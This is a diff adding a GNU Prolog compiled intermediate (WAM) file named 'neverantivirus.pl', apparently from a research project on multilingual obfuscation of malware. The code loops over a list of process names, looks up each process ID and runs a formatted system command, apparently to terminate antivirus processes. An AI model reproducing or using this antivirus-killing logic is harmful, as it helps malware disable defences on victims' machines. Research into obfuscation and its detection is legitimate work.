@@ -1,0 +1,105 @@
+% compiler: GNU Prolog 1.4.2
+% file    : neverantivirus.pl
+
+
+file_name('/home/yufeijiang/Dropbox/security thursday/multilingual obfuscation/babel/evaluation/hunacha/hunatcha/translation/neverantivirus.pl').
+
+
+predicate(never_anti_virus/1,7,static,private,monofile,global,[
+    get_variable(x(1),0),
+    call_c('Pl_Set_Bip_Name_Untagged_2',[by_value],[is,2]),
+    put_integer(0,0),
+    execute(loop/2)]).
+
+
+predicate(loop/2,9,static,private,monofile,global,[
+    try_me_else(1),
+    allocate(4),
+    get_variable(y(0),0),
+    get_variable(y(1),1),
+    call_c('Pl_Set_Bip_Name_Untagged_2',[by_value],[is,2]),
+    math_load_value(y(1),0),
+    math_load_value(y(0),1),
+    put_integer(4,2),
+    call_c('Pl_Fct_Mul',[fast_call,x(1)],[x(1),x(2)]),
+    call_c('Pl_Fct_Add',[fast_call,x(0)],[x(0),x(1)]),
+    put_variable(y(2),1),
+    call(string_ptr_dereference/2),
+    call_c('Pl_Set_Bip_Name_Untagged_2',[by_value],[=\=,2]),
+    math_load_value(y(2),0),
+    put_integer(0,1),
+    call_c('Pl_Blt_Neq',[fast_call,boolean],[x(0),x(1)]),
+    put_value(y(2),0),
+    put_variable(y(3),1),
+    call(findprocessid_wrapper/2),
+    put_value(y(3),0),
+    call('$loop/2_$aux1'/1),
+    call_c('Pl_Set_Bip_Name_Untagged_2',[by_value],[is,2]),
+    math_load_value(y(0),0),
+    call_c('Pl_Fct_Inc',[fast_call,x(0)],[x(0)]),
+    put_value(y(1),1),
+    deallocate,
+    execute(loop/2),
+
+label(1),
+    trust_me_else_fail,
+    allocate(0),
+    call_c('Pl_Set_Bip_Name_Untagged_2',[by_value],[is,2]),
+    math_load_value(x(1),1),
+    math_load_value(x(0),0),
+    put_integer(4,2),
+    call_c('Pl_Fct_Mul',[fast_call,x(0)],[x(0),x(2)]),
+    call_c('Pl_Fct_Add',[fast_call,x(0)],[x(1),x(0)]),
+    put_void(1),
+    call(string_ptr_dereference/2),
+    put_structure((=\=)/2,0),
+    unify_void(1),
+    unify_integer(0),
+    deallocate,
+    execute((\+)/1)]).
+
+
+predicate('$loop/2_$aux1'/1,9,static,private,monofile,local,[
+    try_me_else(1),
+    allocate(1),
+    call_c('Pl_Set_Bip_Name_Untagged_2',[by_value],[=\=,2]),
+    math_load_value(x(0),1),
+    put_integer(0,2),
+    call_c('Pl_Blt_Neq',[fast_call,boolean],[x(1),x(2)]),
+    put_variable(y(0),1),
+    call(sprintf_wrapper/2),
+    put_unsafe_value(y(0),0),
+    deallocate,
+    execute(system_wrapper/1),
+
+label(1),
+    trust_me_else_fail,
+    execute(nl/0)]).
+
+
+predicate(findprocessid_wrapper/2,1,static,private,monofile,global,[
+    foreign_call_c(findprocessid_wrapper,boolean,findprocessid_wrapper/2,-1,[(in,string),(out,integer)]),
+    proceed]).
+
+
+predicate(string_ptr_dereference/2,2,static,private,monofile,global,[
+    foreign_call_c(string_ptr_dereference,boolean,string_ptr_dereference/2,-1,[(in,float),(out,string)]),
+    proceed]).
+
+
+predicate(sprintf_wrapper/2,3,static,private,monofile,global,[
+    foreign_call_c(sprintf_wrapper,boolean,sprintf_wrapper/2,-1,[(in,integer),(out,string)]),
+    proceed]).
+
+
+predicate(system_wrapper/1,4,static,private,monofile,global,[
+    foreign_call_c(system_wrapper,boolean,system_wrapper/1,-1,[(in,string)]),
+    proceed]).
+
+
+predicate(char_ptr_dereference/2,5,static,private,monofile,global,[
+    foreign_call_c(char_ptr_dereference,boolean,char_ptr_dereference/2,-1,[(in,float),(out,char)]),
+    proceed]).
+
+
+ensure_linked(['$force_foreign_link'/0]).
